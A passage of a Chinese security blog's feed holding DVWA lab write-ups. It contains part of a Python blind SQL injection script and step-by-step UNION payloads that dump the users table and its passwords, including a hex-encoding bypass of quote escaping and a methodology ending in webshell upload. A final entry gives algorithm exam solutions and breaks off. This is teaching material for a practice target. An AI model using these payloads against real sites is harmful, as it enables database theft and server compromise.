class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#"</span>.format(table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#"</span>.format(table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)#"</span>.format(str(i),table_name,str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)#"</span>.format(column_name,table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)#"</span>.format(column_name,table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)#"</span>.format(column_name,str(i),table_name,str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DVWA的sql盲注。&lt;/p&gt;
    
    </summary>
    
    
      <category term="sql注入" scheme="https://1187100546.github.io/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="sql注入" scheme="https://1187100546.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DVWA-SQL_Injection(SQL注入)</title>
    <link href="https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/"/>
    <id>https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/</id>
    <published>2019-10-28T11:39:18.000Z</published>
    <updated>2019-11-22T01:30:33.721Z</updated>
    
    <content type="html"><![CDATA[<p>DVWA里的SQL注入。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入分类</span><br><span class="line">按SQLMap中的分类来看，SQL注入类型有以下 5 种：</span><br><span class="line"> UNION query SQL injection（可联合查询注入） </span><br><span class="line"> Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line"> Boolean-based blind SQL injection（布尔型注入） </span><br><span class="line"> Error-based SQL injection（报错型注入）</span><br><span class="line"> Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入常规利用思路：</span><br><span class="line">1、寻找注入点，可以通过 web 扫描工具实现 </span><br><span class="line">2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 </span><br><span class="line">3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）</span><br><span class="line">4、可以通过获得的用户信息，寻找后台登录。 </span><br><span class="line">5、利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">手工注入常规思路：</span><br><span class="line">1.判断是否存在注入，注入是字符型还是数字型 </span><br><span class="line">2.猜解 SQL 查询语句中的字段数</span><br><span class="line">3.确定显示的字段顺序 </span><br><span class="line">4.获取当前数据库 </span><br><span class="line">5.获取数据库中的表 </span><br><span class="line">6.获取表中的字段名 </span><br><span class="line">7.查询到账户的数据</span><br></pre></td></tr></table></figure><h3 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h3><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>由代码可知，通过<code>REQUEST</code>方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。</p><p><strong>常见注入测试的POC：</strong></p><ul><li>… where user_id = $id   —-&gt;   … where user_id = 1 or 1024=1024</li><li>… where user_id = ‘$id’   —-&gt;   …where user_id = ‘1’ or ‘1024’=’1024’</li><li>… where user_id = “$id”   —-&gt;   … where user_id = “1” or “1024”=”1024”</li></ul><h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p><code>输入1，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgwPW6.png" alt="KgwPW6.png"></p><p><code>输入1&#39;and &#39;1&#39; =&#39;2，查询失败，返回结果为空：</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgwRt1.png" alt="KgwRt1.png"></p><p><code>输入1&#39; or &#39;1&#39;=&#39;1 页面正常，并返回更多信息，成功查询</code></p><p><img src="https://s2.ax1x.com/2019/10/28/Kg0wEd.png" alt="Kg0wEd.png"></p><p><strong><code>判断存在的是字符型注入。</code></strong></p><h4 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h4><p><code>输入1&#39; or 1=1 order by 1 #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgDOhR.png" alt="KgDOhR.png"></p><p><code>输入1&#39; or 1=1 order by 2 #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgrhUH.png" alt="KgrhUH.png"></p><p><code>输入1&#39; or 1=1 order by 3 #，查询失败： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/10/28/KgsUzt.png" alt="KgsUzt.png"></p><p> <code>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</code></p><h4 id="确认显示的字段顺序"><a href="#确认显示的字段顺序" class="headerlink" title="确认显示的字段顺序"></a>确认显示的字段顺序</h4><p> <code>输入1&#39; union select 1,2 #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQK7Of.png" alt="MQK7Of.png"></p><p> 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… </p><h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><p> <code>输入1&#39; union select 1,database() #，查询成功：#是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQMl7D.png" alt="MQMl7D.png"></p><p> 说明当前的数据库为dvwa。 </p><h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><p><code>输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQM7C9.png" alt="MQM7C9.png"></p><p> 说明数据库dvwa中一共有两个表，guestbook与users。 </p><h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><p><code>输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQlbm6.png" alt="MQlbm6.png"></p><p>圈起来是是字段名</p><h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p><code>输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MQ1ncn.png" alt="MQ1ncn.png"></p><p> 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 </p><h3 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 </p><p><img src="https://s2.ax1x.com/2019/11/11/MlYjiV.png" alt="MlYjiV.png"></p><p> 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 </p><h4 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a><strong>判断是否存在注入，注入是字符型还是数字型</strong></h4><p> <code>抓包更改参数id为1&#39; or 1=1 # 报错： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlNW38.png" alt="MlNW38.png"></p><p><img src="https://s2.ax1x.com/2019/11/11/MlNhjg.png" alt="MlNhjg.png"></p><p><img src="https://s2.ax1x.com/2019/11/11/MlNIBj.png" alt="MlNIBj.png"></p><p> <code>抓包更改参数id为1 or 1=1 #，查询成功：</code> </p><p><img src="https://s2.ax1x.com/2019/11/11/MlUAgO.png" alt="MlUAgO.png"></p><p><img src="https://s2.ax1x.com/2019/11/11/MlUEvD.png" alt="MlUEvD.png"></p><p> <code>说明存在数字型注入。</code></p><p> 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 </p><h4 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a><strong>猜解SQL查询语句中的字段数</strong></h4><p><code>抓包更改参数id为1 order by 2 #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlwIzV.png" alt="MlwIzV.png"></p><p><code>抓包更改参数id为1 order by 3 #，报错：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlwLdJ.png" alt="MlwLdJ.png"></p><p><code>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</code></p><h4 id="确定显示的字段顺序"><a href="#确定显示的字段顺序" class="headerlink" title="确定显示的字段顺序"></a><strong>确定显示的字段顺序</strong></h4><p> <code>抓包更改参数id为1 union select 1,2 #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/Ml0JWq.png" alt="Ml0JWq.png"></p><p> 说明执行的SQL语句为select First name,Surname from 表 where ID=id… </p><h4 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a><strong>获取当前数据库</strong></h4><p> <code>抓包更改参数id为1 union select 1,database() #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/Ml0j0g.png" alt="Ml0j0g.png"></p><p><code>说明当前的数据库为dvwa。</code></p><h4 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a><strong>获取数据库中的表</strong></h4><p><code>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlBK91.png" alt="MlBK91.png"></p><p><code>说明数据库dvwa中一共有两个表，guestbook与users。</code></p><h4 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a><strong>获取表中的字段名</strong></h4><p><code>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/Mls0jx.png" alt="Mls0jx.png"></p><p> 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 ‘’ </p><p><code>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：</code><img src="https://s2.ax1x.com/2019/11/11/MlrFwF.png" alt="MlrFwF.png"></p><p><code>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</code></p><h4 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a><strong>下载数据</strong></h4><p><code>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlraOf.png" alt="MlraOf.png"></p><h3 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h3><h4 id="SQL-Injection-Source"><a href="#SQL-Injection-Source" class="headerlink" title="SQL Injection Source"></a>SQL Injection Source</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a><strong>分析：</strong></h4><p> 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 </p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a><strong>漏洞利用:</strong></h4><p> 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 </p><p><code>输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/12/M3q1r6.png" alt="M3q1r6.png"></p><p><strong>特别注意：</strong>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p><p><strong>参考链接：</strong> <a href="https://www.jianshu.com/p/e51cd8f15a84" target="_blank" rel="noopener">https://www.jianshu.com/p/e51cd8f15a84</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DVWA里的SQL注入。&lt;/p&gt;
    
    </summary>
    
    
      <category term="sql注入" scheme="https://1187100546.github.io/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="sql注入" scheme="https://1187100546.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>算法实验考试</title>
    <link href="https://1187100546.github.io/2019/10/28/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E8%80%83%E8%AF%95/"/>
    <id>https://1187100546.github.io/2019/10/28/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E8%80%83%E8%AF%95/</id>
    <published>2019-10-28T11:35:20.000Z</published>
    <updated>2019-11-09T07:44:34.022Z</updated>
    
    <content type="html"><![CDATA[<p>算法实验上机考试</p><a id="more"></a><h2 id="问题-A-进制转换"><a href="#问题-A-进制转换" class="headerlink" title="问题 A: 进制转换"></a>问题 A: 进制转换</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个十进制正整数N，请将其转换为十六进制并输出。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>一个十进制正整数N。( 1 &lt;= N &lt;= 2×10<sup>9</sup> )</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>输出N对应的十六进制，用数字 0<del>9 以及大写字母 A</del>F 来表示。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7E3</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>递归</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> *t=<span class="string">"0123456789ABCDEF"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f(n/<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;t[n%<span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">    f(m);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-背包问题"><a href="#问题-B-背包问题" class="headerlink" title="问题 B: 背包问题"></a>问题 B: 背包问题</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>在N件物品取出若干件放在容量为W的背包里，每件物品的体积为W1，W2……Wn（Wi为整数），与之相对应的价值为P1,P2……Pn（Pi为整数）。求背包能够容纳的最大价值。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第1行，2个整数，N和W中间用空格隔开。N为物品的数量，W为背包的容量。(1 &lt;= N &lt;= 1000，1 &lt;= W &lt;= 105)<br>第2 ~ N+1行，每行2个整数，Wi和Pi，分别是物品的体积和物品的价值。(1 &lt;= Wi &lt;= 10<sup>5</sup>，1 &lt;= Pi &lt;= 2×10<sup>9</sup>)</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出可以容纳的最大价值。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3 6</span><br><span class="line">2 5</span><br><span class="line">3 8</span><br><span class="line">4 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" 